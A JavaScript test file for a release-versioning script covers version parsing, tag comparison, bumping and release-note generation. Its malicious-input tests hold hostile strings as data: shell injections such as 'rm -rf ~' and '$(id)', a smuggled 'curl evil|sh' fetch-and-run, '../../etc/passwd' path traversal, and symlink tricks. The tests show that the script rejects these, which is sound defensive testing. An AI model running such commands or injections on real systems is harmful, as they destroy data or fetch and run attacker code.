'use strict';
// release-version.test.js — VERSION 파일과 v* 태그 비교·올리기 (계획서 결정 32)
// 정상 / 악성·우회 / 경계 3계층
const test = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { spawnSync, execFileSync } = require('child_process');
const { parseVersion, latestTag, bump, checkVersion } = require('./release-version');

const REPO = path.resolve(__dirname, '..');
const g = (cwd, ...a) => execFileSync('git', a, { cwd, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] });
// 스크립트를 담은 임시 레포 (실제 레포·원격을 건드리지 않음)
function tmpRepo(version, tags = []) {
  const d = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'relv-')));
  fs.mkdirSync(path.join(d, 'scripts'));
  fs.copyFileSync(path.join(__dirname, 'release-version.js'), path.join(d, 'scripts', 'release-version.js'));
  g(d, 'init', '-q'); g(d, 'config', 'user.email', 't@t'); g(d, 'config', 'user.name', 't');
  if (version !== null) fs.writeFileSync(path.join(d, 'VERSION'), version);
  g(d, 'add', '-A'); g(d, 'commit', '-q', '-m', 'init');
  for (const t of tags) g(d, 'tag', t);
  return d;
}
const run = (d, ...a) => spawnSync(process.execPath, [path.join(d, 'scripts', 'release-version.js'), ...a], { cwd: d, encoding: 'utf8' });

// ── 정상 ─────────────────────────────────────────────────────────────
test('정상: 버전 읽기·최신 태그·올리기', () => {
  assert.deepStrictEqual(parseVersion('1.0.2\n'), [1, 0, 2]);
  assert.deepStrictEqual(latestTag(['v1.0.0', 'v1.0.10', 'v1.0.9']), [1, 0, 10], '숫자로 비교 (1.0.10 > 1.0.9)');
  assert.deepStrictEqual(bump([1, 0, 9]), [1, 0, 10]);
  assert.deepStrictEqual(bump([1, 2, 3], 'minor'), [1, 3, 0]);
  assert.deepStrictEqual(bump([1, 2, 3], 'major'), [2, 0, 0]);
});

test('정상: VERSION 이 최신 태그보다 크면 통과, 같거나 작으면 실패 + 다음 버전 제안', () => {
  assert.strictEqual(checkVersion('1.0.2\n', ['v1.0.0', 'v1.0.1']).ok, true);
  const same = checkVersion('1.0.1\n', ['v1.0.0', 'v1.0.1']);
  assert.strictEqual(same.ok, false); assert.strictEqual(same.next, '1.0.2'); assert.strictEqual(same.latest, 'v1.0.1');
  assert.strictEqual(checkVersion('1.0.0', ['v1.0.1']).ok, false);
});

test('정상: CLI — check 는 커밋된 값, bump 는 VERSION 을 쓰고 이미 올렸으면 그대로, release-tag 는 v 붙인 이름', () => {
  const d = tmpRepo('1.0.1\n', ['v1.0.0', 'v1.0.1']);
  assert.strictEqual(run(d, 'check').status, 1);
  let r = run(d, 'bump');
  assert.strictEqual(r.status, 0, r.stderr); assert.match(r.stdout, /1\.0\.1 → 1\.0\.2/);
  assert.strictEqual(fs.readFileSync(path.join(d, 'VERSION'), 'utf8'), '1.0.2\n');
  assert.strictEqual(run(d, 'check').status, 1, '커밋 전에는 HEAD 값(1.0.1)으로 판정');
  g(d, 'commit', '-qam', 'bump');
  r = run(d, 'check'); assert.strictEqual(r.status, 0, r.stderr); assert.match(r.stdout, /1\.0\.2 > 최신 태그 v1\.0\.1/);
  r = run(d, 'bump'); assert.match(r.stdout, /이미 최신 태그보다 큽니다/, '두 번 실행해도 두 번 올리지 않음');
  assert.strictEqual(fs.readFileSync(path.join(d, 'VERSION'), 'utf8'), '1.0.2\n');
  assert.strictEqual(run(d, 'release-tag').stdout.trim(), 'v1.0.2');
  assert.strictEqual(run(d, 'latest').stdout.trim(), 'v1.0.1');
});

test('정상: 실제 레포 VERSION 은 형식이 맞다', () => {
  assert.ok(parseVersion(fs.readFileSync(path.join(REPO, 'VERSION'), 'utf8')), 'VERSION 은 X.Y.Z 한 줄');
});

// ── 악성·우회 ────────────────────────────────────────────────────────
test('악성: VERSION 에 셸 문자·접두어·접미어·줄 여러 개·0 앞붙임·초대형 숫자 → 형식 오류', () => {
  for (const bad of ['1.0.2; rm -rf ~', '$(id)', 'v1.0.2', '1.0.2-beta', '1.0.2\n1.0.3', ' 1.0.2', '1.0', '1.0.2.3', '01.0.2', '1.0.9999999', '1.0.2\n\n', '１.0.2', '', null, 7, 'x'.repeat(1000)]) {
    assert.strictEqual(parseVersion(bad), null, JSON.stringify(bad));
    assert.strictEqual(checkVersion(bad, ['v1.0.0']).ok, false, JSON.stringify(bad));
  }
});

test('악성: 위장 태그(v9.9.9-evil · v9.9.9.1 · V9.0.0 · 9.9.9 · 공백 붙은 것)는 최신 판정에서 무시', () => {
  const tags = ['v1.0.1', 'v9.9.9-evil', 'v9.9.9.1', 'V9.0.0', '9.9.9', 'v9.9.9 ', 'refs/tags/v9.9.9', 'v09.0.0'];
  assert.deepStrictEqual(latestTag(tags), [1, 0, 1]);
  assert.strictEqual(checkVersion('1.0.2', tags).ok, true, '위장 태그 때문에 막히지 않음');
});

test('악성: release-tag 는 VERSION 이 링크·형식 오류면 실패 (워크플로가 이상한 태그를 만들지 않음)', () => {
  const d = tmpRepo('1.0.2\n');
  fs.writeFileSync(path.join(d, 'VERSION'), '1.0.2"; curl evil|sh #\n');
  assert.strictEqual(run(d, 'release-tag').status, 1);
  fs.rmSync(path.join(d, 'VERSION'));
  fs.writeFileSync(path.join(d, 'elsewhere'), '9.9.9\n');
  // 윈도우 권한 없으면(EPERM, 개발자 모드 꺼짐) 링크 시험만 건너뜀 — 그 PC 에선 공격자도 파일 심볼릭 링크를 못 만든다
  if (require('../.claude/hooks/lib/testfs').trySymlink(path.join(d, 'elsewhere'), path.join(d, 'VERSION')) !== null) assert.strictEqual(run(d, 'release-tag').status, 1, '링크는 거부');
});

// ── 경계 ─────────────────────────────────────────────────────────────
test('경계: 태그가 하나도 없으면(첫 릴리스) 형식만 맞으면 통과, VERSION 없으면 bump 가 0.0.1', () => {
  assert.strictEqual(checkVersion('1.0.0', []).ok, true);
  assert.strictEqual(checkVersion('1.0.0', undefined).ok, true);
  const d = tmpRepo(null);
  assert.strictEqual(run(d, 'check').status, 1, 'VERSION 이 커밋 안 됐으면 실패');
  const r = run(d, 'bump'); assert.strictEqual(r.status, 0, r.stderr);
  assert.strictEqual(fs.readFileSync(path.join(d, 'VERSION'), 'utf8'), '0.0.1\n');
});

test('경계: 모르는 올림 종류·모르는 명령은 오류, --remote 는 원격이 없으면 로컬 태그로', () => {
  assert.throws(() => bump([1, 0, 0], 'huge'), /모르는 올림 종류/);
  const d = tmpRepo('1.0.1\n', ['v1.0.1']);
  assert.strictEqual(run(d, 'bump', 'huge').status, 1);
  assert.strictEqual(run(d, 'nope').status, 1);
  const r = run(d, 'check', '--remote');
  assert.strictEqual(r.status, 1); assert.match(r.stderr, /태그: local/);
});

// ── 릴리스 노트 (notes · notes-check · notes-path, 2026-11-17) ─────────────
const { safeTitle, notesFileName, isNotesName, inventory, buildNotes } = require('./release-version');
const W = (d, f, s = 'x\n') => { fs.mkdirSync(path.dirname(path.join(d, f)), { recursive: true }); fs.writeFileSync(path.join(d, f), s); };
// origin/main 이 있는 임시 레포 → 작업 브랜치에서 스킬·훅을 바꾼 커밋 3개(세션 요약 동기화 포함)
function notesRepo() {
  const d = tmpRepo('1.0.1\n', ['v1.0.1']);
  W(d, '.claude/skills/a/SKILL.md'); W(d, 'docs/skills/frontend/a/verification.md');
  W(d, '.claude/hooks/old-hook.js'); W(d, '.claude/hooks/old-hook.test.js'); W(d, '.claude/hooks/package.json', '{}');
  W(d, '.claude/hooks/lib/util.js'); W(d, '.claude/rules/git.md'); W(d, '.claude/agents/meta/m.md'); W(d, '.claude/commands/commit.md');
  g(d, 'add', '-A'); g(d, 'commit', '-q', '-m', '[config] Add: 기본 구성');
  const o = `${d}-origin.git`; g(path.dirname(d), 'init', '-q', '--bare', o);
  g(d, 'remote', 'add', 'origin', o); g(d, 'push', '-q', 'origin', 'HEAD:refs/heads/main'); g(d, 'fetch', '-q', 'origin');
  g(d, 'checkout', '-q', '-b', 'feat');
  W(d, '.claude/skills/b/SKILL.md'); W(d, 'docs/skills/backend/b/verification.md');
  g(d, 'add', '-A'); g(d, 'commit', '-q', '-m', '[skill] Add: b 스킬 추가');
  fs.rmSync(path.join(d, '.claude/hooks/old-hook.js')); W(d, '.claude/hooks/new-hook.js');
  g(d, 'add', '-A'); g(d, 'commit', '-q', '-m', '[config] Modify: 훅 교체');
  W(d, 'exports/s.md'); g(d, 'add', '-A'); g(d, 'commit', '-q', '-m', '[export] sync: s.md');
  return d;
}
const notesDir = (d) => path.join(d, 'docs', 'release-notes');

test('정상: bump 가 VERSION 을 올리고 노트 초안을 만든다 — 이름 = 버전 + 요약, 수 변화·커밋 제목', () => {
  const d = notesRepo();
  const r = run(d, 'bump');
  assert.strictEqual(r.status, 0, r.stderr);
  assert.match(r.stdout, /1\.0\.1 → 1\.0\.2/); assert.match(r.stdout, /릴리스 노트 초안을 만들었습니다/);
  const files = fs.readdirSync(notesDir(d));
  assert.deepStrictEqual(files, ['1.0.2 b 스킬 추가.md'], '요약을 안 주면 가장 오래된 커밋 제목(분류·Type 뗀 것)');
  const c = fs.readFileSync(path.join(notesDir(d), files[0]), 'utf8');
  assert.match(c, /^# 1\.0\.2 b 스킬 추가\n/);
  assert.match(c, /\*\*스킬:\*\* 1 → 2 \(그룹 1 → 2\)/); assert.match(c, /backend: 0 → 1 \(\+1\) — 새 그룹/);
  assert.match(c, /\*\*훅:\*\* 1 → 1\. 추가: `new-hook` \/ 삭제: `old-hook`/, '테스트·package.json·lib/ 는 훅으로 안 셈');
  assert.match(c, /- \[config\] Modify: 훅 교체/); assert.match(c, /- \[skill\] Add: b 스킬 추가/);
  assert.doesNotMatch(c, /export|sync:/, '세션 요약 동기화 커밋은 안 적음');
  assert.doesNotMatch(c, /기본 구성/, '기준(origin/main) 이전 커밋은 안 적음');
  assert.doesNotMatch(c, /LFML|지라|\(\w+-\d+\)/, '지라 번호 없음');
});

test('정상: notes --title 로 요약 지정, --print 는 파일을 쓰지 않음, notes-check·notes-path 는 커밋된 노트만', () => {
  const d = notesRepo();
  fs.writeFileSync(path.join(d, 'VERSION'), '1.0.2\n'); g(d, 'commit', '-qam', '[config] Modify: 버전 1.0.2');
  assert.strictEqual(run(d, 'notes-check').status, 1, '노트 없음');
  assert.strictEqual(run(d, 'notes-path').stdout, '\n');
  let r = run(d, 'notes', '--print', '--title', '릴리스 노트 자동 생성');
  assert.strictEqual(r.status, 0, r.stderr); assert.match(r.stdout, /^# 1\.0\.2 릴리스 노트 자동 생성/);
  assert.doesNotMatch(r.stdout, /버전 1\.0\.2/, '버전 올림 커밋은 안 적음');
  assert.ok(!fs.existsSync(notesDir(d)), '--print 는 쓰지 않음');
  r = run(d, 'notes', '--title', '릴리스 노트 자동 생성');
  assert.strictEqual(r.status, 0, r.stderr);
  assert.strictEqual(run(d, 'notes-check').status, 1, '작업 폴더에만 있으면 아직 실패');
  g(d, 'add', '-A'); g(d, 'commit', '-qm', '[docs] Add: 1.0.2 릴리스 노트');
  r = run(d, 'notes-check'); assert.strictEqual(r.status, 0, r.stderr);
  assert.strictEqual(run(d, 'notes-path').stdout.trim(), 'docs/release-notes/1.0.2 릴리스 노트 자동 생성.md');
  r = run(d, 'notes', '--title', '다른 요약');
  assert.match(r.stdout, /이미 있습니다 — 덮어쓰지 않음/);
  assert.deepStrictEqual(fs.readdirSync(notesDir(d)), ['1.0.2 릴리스 노트 자동 생성.md'], '같은 버전 노트는 하나만');
});

test('악성: 제목의 경로 조작·위험 글자·대괄호는 지우고 50자로 — 노트 폴더 밖에 쓰지 않음', () => {
  for (const t of ['../../etc/passwd', 'a/b\\c', '$(rm -rf ~)', '`id`', 'x: y * z ? "q" <r> |s|', '[1.0.2] 괄호', '#%{}^~', 'a\u0000b\nc\u001b[31m']) {
    const s = safeTitle(t);
    assert.doesNotMatch(s, /[/\\:*?"<>|[\]#%{}^~`$\u0000-\u001f]/, `${JSON.stringify(t)} → ${JSON.stringify(s)}`);
    assert.ok(!s.includes('..'), s);
  }
  assert.strictEqual([...safeTitle('가'.repeat(80))].length, 50);
  assert.strictEqual(safeTitle(''), '수정내용'); assert.strictEqual(safeTitle('...'), '수정내용'); assert.strictEqual(safeTitle(null), '수정내용');
  assert.strictEqual(safeTitle('--force 옵션'), 'force 옵션', '옵션처럼 보이는 앞 - 제거');
  const d = notesRepo();
  fs.writeFileSync(path.join(d, 'VERSION'), '1.0.2\n');
  const r = run(d, 'notes', '--title', '../../../../evil');
  assert.strictEqual(r.status, 0, r.stderr);
  assert.deepStrictEqual(fs.readdirSync(notesDir(d)), ['1.0.2 evil.md']);
  assert.ok(!fs.existsSync(path.join(path.dirname(d), 'evil.md')));
});

test('악성: --base 에 옵션·범위·셸 문자 → 거부, 노트 폴더가 링크면 쓰지 않음, 이미 있는 파일(링크 포함)은 덮어쓰지 않음', () => {
  const d = notesRepo();
  fs.writeFileSync(path.join(d, 'VERSION'), '1.0.2\n');
  for (const b of ['--output=/tmp/x', '-p', 'HEAD~1..HEAD', 'a b', '$(id)', '']) {
    const r = buildNotes(d, { base: b, write: false });
    assert.strictEqual(r.ok, false, JSON.stringify(b));
  }
  assert.strictEqual(run(d, 'notes', '--base').status, 1, '--base 뒤 값 없음');
  assert.strictEqual(run(d, 'notes', '--title', '--print').status, 1, '--title 뒤가 옵션');
  const outside = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'relv-out-')));
  fs.mkdirSync(path.join(d, 'docs'), { recursive: true });
  const { trySymlink } = require('../.claude/hooks/lib/testfs');
  if (trySymlink(outside, notesDir(d), 'dir') !== null) {
    const r = run(d, 'notes', '--title', 'x');
    assert.strictEqual(r.status, 1); assert.match(r.stderr, /폴더가 아닙니다/);
    assert.deepStrictEqual(fs.readdirSync(outside), [], '링크 너머에 쓰지 않음');
    fs.rmSync(notesDir(d));
  }
  fs.mkdirSync(notesDir(d));
  const victim = path.join(outside, 'victim'); fs.writeFileSync(victim, 'keep\n');
  if (trySymlink(victim, path.join(notesDir(d), '1.0.2 링크.md'), 'file') !== null) {
    const r = run(d, 'notes', '--title', '링크');
    assert.strictEqual(r.status, 0); assert.match(r.stdout, /이미 있습니다/);
    assert.strictEqual(fs.readFileSync(victim, 'utf8'), 'keep\n', '링크를 따라가 덮어쓰지 않음');
  }
});

test('악성: 커밋 제목의 줄바꿈·제어 문자가 노트 구조를 깨지 않음', () => {
  const d = notesRepo();
  W(d, 'z.txt'); g(d, 'add', '-A'); g(d, 'commit', '-q', '-m', '[docs] Add: 첫 줄\u001b[2J', '-m', '## 가짜 제목\n- 가짜 항목');
  fs.writeFileSync(path.join(d, 'VERSION'), '1.0.2\n');
  const r = buildNotes(d, { write: false, title: 't' });
  assert.ok(r.ok, r.message);
  assert.doesNotMatch(r.content, /\u001b/); assert.doesNotMatch(r.content, /가짜 제목/, '본문(-m 두 번째)은 안 적음');
  assert.strictEqual((r.content.match(/^## /gm) || []).length, 2, '## 수 변화 · ## 큰 수정 내용 두 개만');
});

test('경계: origin/main 없음·기준 = HEAD·VERSION 없음/형식 오류 → 실패(안내), bump --no-notes 는 노트 안 만듦, bump 는 노트 실패해도 성공', () => {
  const plain = tmpRepo('1.0.1\n', ['v1.0.1']);
  let r = run(plain, 'notes');
  assert.strictEqual(r.status, 1); assert.match(r.stderr, /origin\/main 없음/);
  r = run(plain, 'bump'); assert.strictEqual(r.status, 0, r.stderr); assert.match(r.stdout, /릴리스 노트는 만들지 못했습니다/);
  const d = notesRepo();
  r = run(d, 'bump', '--no-notes'); assert.strictEqual(r.status, 0, r.stderr);
  assert.ok(!fs.existsSync(notesDir(d)), '--no-notes');
  r = run(d, 'notes', '--base', 'HEAD'); assert.strictEqual(r.status, 1); assert.match(r.stderr, /HEAD 가 같아/);
  fs.writeFileSync(path.join(d, 'VERSION'), 'abc\n');
  assert.strictEqual(run(d, 'notes').status, 1);
  fs.rmSync(path.join(d, 'VERSION'));
  assert.strictEqual(run(d, 'notes').status, 1);
  assert.strictEqual(run(tmpRepo(null), 'notes-check').status, 1, '커밋된 VERSION 없음');
});

test('경계: 이름 판정 — 1.0.2 노트와 1.0.20·요약 없는 이름·하위 경로 구분, 빈 목록 inventory', () => {
  assert.strictEqual(notesFileName('1.0.2', '요약'), '1.0.2 요약.md');
  assert.ok(isNotesName('1.0.2 요약.md', '1.0.2'));
  for (const n of ['1.0.20 요약.md', '1.0.2.md', '1.0.2 요약.txt', 'x/1.0.2 a.md', '1.0.2 a\\b.md', '[1.0.2] a.md', null]) assert.ok(!isNotesName(n, '1.0.2'), String(n));
  const inv = inventory([]);
  assert.strictEqual(inv.skills.size + inv.agents.size + inv.hooks.size + inv.rules.size + inv.commands.size, 0);
  const inv2 = inventory(['.claude/agents/README.md', '.claude/agents/CLAUDE.md', '.claude/skills/x/SKILL.md', '.claude/hooks/a.test.js', '.claude/hooks/statusline.sh']);
  assert.strictEqual(inv2.agents.size, 0, 'README·CLAUDE 는 에이전트 아님');
  assert.deepStrictEqual([...inv2.skills.keys()], ['기타'], 'verification.md 없는 스킬은 기타 그룹');
  assert.deepStrictEqual([...inv2.hooks], ['statusline.sh']);
});

test('정상: 실제 레포 — 커밋된 VERSION 의 노트 이름 규칙(있다면)을 지킨다', () => {
  const dir = path.join(REPO, 'docs', 'release-notes');
  if (!fs.existsSync(dir)) return;
  for (const n of fs.readdirSync(dir)) {
    const m = n.match(/^(\d+\.\d+\.\d+) (.+)\.md$/);
    assert.ok(m && parseVersion(m[1]), `이름 형식: ${n}`);
    assert.strictEqual(safeTitle(m[2]), m[2], `위험 글자 없는 요약: ${n}`);
  }
});
